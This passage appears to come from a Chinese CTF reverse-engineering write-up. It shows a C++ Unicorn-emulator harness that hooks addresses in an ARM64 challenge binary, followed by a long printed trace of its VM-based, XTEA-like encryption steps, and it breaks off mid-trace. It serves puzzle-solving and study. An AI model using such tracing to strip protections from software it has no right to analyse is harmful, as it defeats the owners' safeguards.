class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unicorn/unicorn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;unicorn-import.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="type">uint64_t</span> address, <span class="type">uint32_t</span> size, <span class="type">void</span>* user_data)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> w0,w1,w2,w3,w4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1fac</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n&quot;</span>, w1,w0,w1^w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2BE4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &gt;&gt; W0 --- %llx &gt;&gt; %llx = %llx\n&quot;</span>, w1, w0, w1 &gt;&gt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2DB4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n&quot;</span>, w1, w0, w1 &lt;&lt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x232C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n&quot;</span>, w0, w3, w0 &amp; w3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2054</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2238</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2180</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W4, &amp;w4);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n&quot;</span>, w1, w4, w1 ^ w4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1CC4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1A0C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> Input[] = <span class="string">&quot;11112222111111111111111111111111&quot;</span>;</span><br><span class="line">    uc_engine* uc&#123;&#125;;</span><br><span class="line">    uc_hook hook;</span><br><span class="line">    <span class="type">uint64_t</span> InputAddr = <span class="number">0x14C28</span>;</span><br><span class="line">    <span class="type">uint64_t</span> Stack = <span class="number">0x7F0000</span>;</span><br><span class="line">    <span class="type">uint8_t</span> MyEncFlag[<span class="number">100</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> Base = <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="built_in">uc_open</span>(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &amp;uc);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, <span class="number">0</span>, Base, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, Stack - <span class="number">4096</span>, <span class="number">0x4000</span>, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_hook_add</span>(uc, &amp;hook, UC_HOOK_CODE, hook_code, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14C28</span>, (LPVOID)&amp;Input, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x0C70</span>, (LPVOID)&amp;Code, <span class="number">8840u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14010</span>, (LPVOID)Data1, <span class="number">0x9B8u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x30F0</span>, (LPVOID)&amp;Data2, <span class="number">0x54u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x149E8</span>, (LPVOID)&amp;Data3, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">0xC7</span>, (LPVOID)&amp;InputAddr);<span class="comment">// X0</span></span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">4</span>, (LPVOID)&amp;Stack);       <span class="comment">// SP</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">uc_emu_start</span>(uc, <span class="number">0x0C70</span>, <span class="number">0x2EF4</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_mem_read</span>(uc, InputAddr, &amp;MyEncFlag, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, MyEncFlag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">uc_close</span>(uc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后运行输出得到一个vm加密流程</p><p>以下是部分输出内容。</p><p>output:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">0</span> = <span class="number">4</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">1</span> = <span class="number">8</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">32323232</span> &gt;&gt; <span class="number">5</span> = <span class="number">1919191</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">32323232</span> &lt;&lt; <span class="number">6</span> = c8c8c8c80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">1919191</span> ^ <span class="number">8</span>c8c8c80 = <span class="number">8</span>d1d1d11</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">32323232</span> ^ <span class="number">11223344</span> = <span class="number">23100176</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">8</span>d1d1d11 + <span class="number">23100176</span> = b02d<span class="number">1e87</span></span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">0</span> &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">0</span> = <span class="number">776</span>f6853</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">776</span>f6853 ^ abab1212 = dcc47a41</span><br><span class="line">W3 = W1 ^ W0 --- b02d<span class="number">1e87</span> ^ dcc47a41 = <span class="number">6</span>ce964c6</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6</span>ce964c6 + <span class="number">31313131</span> = <span class="number">9e1</span>a95f7</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9e1</span>a95f7 &gt;&gt; <span class="number">4</span> = <span class="number">9e1</span>a95f</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">9e1</span>a95f7 &lt;&lt; <span class="number">7</span> = <span class="number">4</span>f0d4afb80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">9e1</span>a95f ^ d4afb80 = <span class="number">4</span>ab52df</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9e1</span>a95f7 ^ <span class="number">55667788</span> = cb7ce27f</span><br><span class="line">W2 = W1 + W0 --- <span class="number">4</span>ab52df + cb7ce27f = d028355e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &gt;&gt; b = bebfc</span><br><span class="line">W2 = W0 &amp; W3 --- bebfc &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">5</span>f5fe<span class="number">6e7</span> = d6cf4f3a</span><br><span class="line">W2 = W0 ^ W3 --- d6cf4f3a ^ <span class="number">23235566</span> = f5ec1a5c</span><br><span class="line">W3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = <span class="number">25</span>c42f02</span><br><span class="line">W2 = W1 + W0 --- <span class="number">25</span>c42f02 + <span class="number">32323232</span> = <span class="number">57</span>f66134</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">57</span>f66134 &gt;&gt; <span class="number">5</span> = <span class="number">2</span>bfb309</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">57</span>f66134 &lt;&lt; <span class="number">6</span> = <span class="number">15</span>fd984d00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">2</span>bfb309 ^ fd984d00 = ff27fe09</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">57</span>f66134 ^ <span class="number">11223344</span> = <span class="number">46</span>d45270</span><br><span class="line">W2 = W1 + W0 --- ff27fe09 + <span class="number">46</span>d45270 = <span class="number">145</span>fc5079</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">5</span>f5fe<span class="number">6e7</span> = d3c94c4b</span><br><span class="line">W2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = <span class="number">78625e59</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">45</span>fc5079 ^ <span class="number">78625e59</span> = <span class="number">3</span>d<span class="number">9e0</span>e20</span><br><span class="line">W2 = W1 + W0 --- <span class="number">3</span>d<span class="number">9e0</span>e20 + <span class="number">9e1</span>a95f7 = dbb8a417</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dbb8a417 &gt;&gt; <span class="number">4</span> = dbb8a41</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- dbb8a417 &lt;&lt; <span class="number">7</span> = <span class="number">6</span>ddc520b80</span><br><span class="line">W3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d<span class="number">1e981</span>c1</span><br><span class="line">W2 = W0 ^ W3 --- dbb8a417 ^ <span class="number">55667788</span> = <span class="number">8</span>eded39f</span><br><span class="line">W2 = W1 + W0 --- d<span class="number">1e981</span>c1 + <span class="number">8</span>eded39f = <span class="number">160</span>c85560</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bebfcdce &gt;&gt; b = <span class="number">17</span>d7f9</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">17</span>d7f9 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + bebfcdce = <span class="number">1242</span>b2f3b</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">242</span>b2f3b ^ <span class="number">23235566</span> = <span class="number">7087</span>a5d</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7087</span>a5d ^ <span class="number">60</span>c85560 = <span class="number">67</span>c02f3d</span><br><span class="line">W2 = W1 + W0 --- <span class="number">67</span>c02f3d + <span class="number">57</span>f66134 = bfb69071</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfb69071 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>fdb483</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfb69071 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>feda41c40</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>fdb483 ^ eda41c40 = e859a8c3</span><br><span class="line">W2 = W0 ^ W3 --- bfb69071 ^ <span class="number">11223344</span> = ae94a335</span><br><span class="line">W2 = W1 + W0 --- e859a8c3 + ae94a335 = <span class="number">196</span>ee4bf8</span><br><span class="line">W2 = W0 &amp; W3 --- bebfcdce &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + bebfcdce = <span class="number">1202</span>d2d40</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">202</span>d2d40 ^ abab1212 = <span class="number">8</span>b863f52</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">96</span>ee4bf8 ^ <span class="number">8</span>b863f52 = <span class="number">1</span>d6874aa</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>d6874aa + dbb8a417 = f92118c1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f92118c1 &gt;&gt; <span class="number">4</span> = f92118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f92118c1 &lt;&lt; <span class="number">7</span> = <span class="number">7</span>c908c6080</span><br><span class="line">W3 = W1 ^ W0 --- f92118c ^ <span class="number">908</span>c6080 = <span class="number">9</span>f<span class="number">1e710</span>c</span><br><span class="line">W2 = W0 ^ W3 --- f92118c1 ^ <span class="number">55667788</span> = ac476f49</span><br><span class="line">W2 = W1 + W0 --- <span class="number">9</span>f<span class="number">1e710</span>c + ac476f49 = <span class="number">14</span>b<span class="number">65e055</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">1e1f</span>b4b5 &gt;&gt; b = <span class="number">3</span>c3f6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">1e1f</span>b4b5 = <span class="number">7</span>f8d1427</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7</span>f8d1427 ^ <span class="number">23235566</span> = <span class="number">5</span>cae4141</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>cae4141 ^ <span class="number">4</span>b<span class="number">65e055</span> = <span class="number">17</span>cba114</span><br><span class="line">W2 = W1 + W0 --- <span class="number">17</span>cba114 + bfb69071 = d7823185</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- d7823185 &gt;&gt; <span class="number">5</span> = <span class="number">6</span>bc118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- d7823185 &lt;&lt; <span class="number">6</span> = <span class="number">35e08</span>c6140</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">6</span>bc118c ^ e08c6140 = e63070cc</span><br><span class="line">W2 = W0 ^ W3 --- d7823185 ^ <span class="number">11223344</span> = c6a002c1</span><br><span class="line">W2 = W1 + W0 --- e63070cc + c6a002c1 = <span class="number">1</span>acd0738d</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1e1f</span>b4b5 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">1e1f</span>b4b5 = <span class="number">838</span>b1622</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">838</span>b1622 ^ abab1212 = <span class="number">28200430</span></span><br><span class="line">W3 = W1 ^ W0 --- acd0738d ^ <span class="number">28200430</span> = <span class="number">84</span>f077bd</span><br><span class="line">W2 = W1 + W0 --- <span class="number">84</span>f077bd + f92118c1 = <span class="number">17e11907</span>e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7e11907</span>e &gt;&gt; <span class="number">4</span> = <span class="number">7e11907</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">7e11907</span>e &lt;&lt; <span class="number">7</span> = <span class="number">3</span>f08c83f00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7e11907</span> ^ <span class="number">8</span>c83f00 = f292607</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7e11907</span>e ^ <span class="number">55667788</span> = <span class="number">2</span>b<span class="number">77e7f</span>6</span><br><span class="line">W2 = W1 + W0 --- f292607 + <span class="number">2</span>b<span class="number">77e7f</span>6 = <span class="number">3</span>aa10dfd</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7</span>d7f9b9c &gt;&gt; b = faff3</span><br><span class="line">W2 = W0 &amp; W3 --- faff3 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">7</span>d7f9b9c = f<span class="number">1e90100</span></span><br><span class="line">W2 = W0 ^ W3 --- f<span class="number">1e90100</span> ^ <span class="number">23235566</span> = d2ca5466</span><br><span class="line">W3 = W1 ^ W0 --- d2ca5466 ^ <span class="number">3</span>aa10dfd = e86b599b</span><br><span class="line">W2 = W1 + W0 --- e86b599b + d7823185 = <span class="number">1</span>bfed8b20</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfed8b20 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>ff6c59</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfed8b20 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>ffb62c800</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>ff6c59 ^ fb62c800 = fe9da459</span><br><span class="line">W2 = W0 ^ W3 --- bfed8b20 ^ <span class="number">11223344</span> = aecfb864</span><br><span class="line">W2 = W1 + W0 --- fe9da459 + aecfb864 = <span class="number">1</span>ad6d5cbd</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">7</span>d7f9b9c &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">7</span>d7f9b9c = f4ef03ef</span><br><span class="line">W2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = <span class="number">5</span>f4411fd</span><br><span class="line">W3 = W1 ^ W0 --- ad6d5cbd ^ <span class="number">5</span>f4411fd = f2294d40</span><br><span class="line">W2 = W1 + W0 --- f2294d40 + <span class="number">7e11907</span>e = <span class="number">1703</span>addbe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">703</span>addbe &gt;&gt; <span class="number">4</span> = <span class="number">703</span>addb</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">703</span>addbe &lt;&lt; <span class="number">7</span> = <span class="number">381</span>d6edf00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">703</span>addb ^ <span class="number">1</span>d6edf00 = <span class="number">1</span>a6d72db</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">703</span>addbe ^ <span class="number">55667788</span> = <span class="number">255</span>caa36</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>a6d72db + <span class="number">255</span>caa36 = <span class="number">3</span>fca1d11</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dcdf8283 &gt;&gt; b = <span class="number">1</span>b9bf0</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>b9bf0 &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + dcdf8283 = <span class="number">1544</span>eead6</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">544</span>eead6 ^ <span class="number">23235566</span> = <span class="number">776</span>dbfb0</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">776</span>dbfb0 ^ <span class="number">3</span>fca1d11 = <span class="number">48</span>a7a2a1</span><br><span class="line">W2 = W1 + W0 --- <span class="number">48</span>a7a2a1 + bfed8b20 = <span class="number">108952</span>dc1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">8952</span>dc1 &gt;&gt; <span class="number">5</span> = <span class="number">44</span>a96e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">8952</span>dc1 &lt;&lt; <span class="number">6</span> = <span class="number">2254</span>b7040</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">44</span>a96e ^ <span class="number">254</span>b7040 = <span class="number">250</span>fd92e</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">8952</span>dc1 ^ <span class="number">11223344</span> = <span class="number">19</span>b<span class="number">71e85</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">250</span>fd92e + <span class="number">19</span>b<span class="number">71e85</span> = <span class="number">3</span>ec6f7b3</span><br><span class="line">W2 = W0 &amp; W3 --- dcdf8283 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + dcdf8283 = <span class="number">15148e7</span>e7</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5148e7</span>e7 ^ abab1212 = fae3f5f5</span><br><span class="line">W3 = W1 ^ W0 --- <span 